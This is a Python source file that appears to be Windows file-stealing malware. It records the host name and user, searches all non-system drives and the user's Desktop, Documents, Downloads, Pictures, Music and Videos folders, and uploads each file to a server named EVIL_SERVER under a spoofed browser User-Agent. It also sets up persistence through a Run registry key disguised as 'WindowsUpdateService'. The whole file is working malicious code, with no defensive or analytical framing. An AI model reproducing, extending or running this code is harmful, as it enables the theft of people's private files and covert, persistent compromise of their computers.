import subprocess
import requests
import platform
import time
import socket
from config import *
import psutil
def get_system_info():
    hostname = socket.gethostname()
    if platform.system() == "Windows":
        result = subprocess.run(['whoami'], capture_output=True, text=True, shell=True)
        if result.stdout:
            user = result.stdout.strip().split('\\')[-1]
        else:
            user = "unknown"
    else:
        result = subprocess.run(['whoami'], capture_output=True, text=True, shell=True)
        user = result.stdout.strip() if result.stdout else "unknown"
    return hostname, user
def get_all_drives():
    drives = []
    if platform.system() == "Windows":
        cmd = 'wmic logicaldisk get caption'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        for line in result.stdout.split('\n'):
            drive = line.strip()
            if drive and drive != "Caption":
                if drive.upper() != "C:":
                    drives.append(drive + "\\")
        if not drives:
            for partition in psutil.disk_partitions():
                if partition.device.upper() != "C:\\":
                    drives.append(partition.device)
    return drives
def get_special_folders():
    folders = []
    if platform.system() == "Windows":
        ps_script = '''
        [Environment]::GetFolderPath("Desktop"),
        [Environment]::GetFolderPath("Downloads"),
        [Environment]::GetFolderPath("MyDocuments"),
        [Environment]::GetFolderPath("MyPictures"),
        [Environment]::GetFolderPath("MyMusic"),
        [Environment]::GetFolderPath("MyVideos")
        '''
        cmd = f'powershell -Command "{ps_script}"'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        for folder in result.stdout.strip().split(','):
            folder = folder.strip()
            if folder and folder.startswith('C:'):
                folders.append(folder)
    return folders
def find_files_recursive(start_path, extensions=None):
    files = []
    if platform.system() == "Windows":
        ps_script = f'''
        Get-ChildItem -Path "{start_path}" -Recurse -File -ErrorAction SilentlyContinue | 
        ForEach-Object {{ $_.FullName }}
        '''
        cmd = f'powershell -Command "{ps_script}"'
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True, timeout=30)
            for file_path in result.stdout.split('\n'):
                file_path = file_path.strip()
                if file_path:
                    files.append(file_path)
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout searching: {start_path}")
        except Exception as e:
            print(f"[!] Error searching {start_path}: {str(e)}")
    return files
def get_file_size(file_path):
    try:
        ps_script = f'(Get-Item "{file_path}").Length'
        cmd = f'powershell -Command "{ps_script}"'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
        if result.stdout.strip().isdigit():
            return int(result.stdout.strip())
        else:
            return 0
    except:
        return 0
def send_file_to_server(file_path, hostname, user):
    try:
        file_size = get_file_size(file_path)
        if file_size > MAX_FILE_SIZE:
            print(f"[!] Skipping large file: {file_path}")
            return False
        ps_script = f'''
        $filePath = "{file_path}"
        $fileName = [System.IO.Path]::GetFileName($filePath)
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileBytes
        '''
        cmd = f'powershell -Command "{ps_script}"'
        result = subprocess.run(cmd, capture_output=True, text=False, shell=True)
        if result.stdout:
            import io
            boundary = '----WebKitFormBoundary' + str(time.time()).replace('.', '')
            data = io.BytesIO()
            data.write(f'--{boundary}\r\n'.encode())
            data.write(b'Content-Disposition: form-data; name="hostname"\r\n\r\n')
            data.write(f'{hostname}\r\n'.encode())
            data.write(f'--{boundary}\r\n'.encode())
            data.write(b'Content-Disposition: form-data; name="user"\r\n\r\n')
            data.write(f'{user}\r\n'.encode())
            data.write(f'--{boundary}\r\n'.encode())
            data.write(f'Content-Disposition: form-data; name="files"; filename="{file_path.split("\\\\")[-1]}"\r\n'.encode())
            data.write(b'Content-Type: application/octet-stream\r\n\r\n')
            data.write(result.stdout)
            data.write(f'\r\n--{boundary}--\r\n'.encode())
            headers = {
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            response = requests.post(f"{EVIL_SERVER}/upload", data=data.getvalue(), headers=headers)
            if response.status_code == 200:
                print(f"[+] Sent: {file_path}")
                return True
            else:
                print(f"[-] Failed: {file_path} - Status: {response.status_code}")
                return False
        return False
    except Exception as e:
        print(f"[!] Error sending {file_path}: {str(e)}")
        return False
def worker(file_queue, hostname, user):
    while not file_queue.empty():
        try:
            file_path = file_queue.get()
            send_file_to_server(file_path, hostname, user)
            file_queue.task_done()
            time.sleep(0.5)  
        except:
            file_queue.task_done()
def create_persistence():
    if platform.system() == "Windows":
        try:
            ps_script = '''
            $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            $regName = "WindowsUpdateService"
            $currentPath = [System.Reflection.Assembly]::GetExecutingAssembly().Location
            New-ItemProperty -Path $regPath -Name $regName -Value $currentPath -PropertyType String -Force
            '''
            subprocess.run(['powershell', '-Command', ps_script], shell=True, capture_output=True)
            print("[+] Persistence created in registry")
        except:
            print("[!] Failed to create persistence")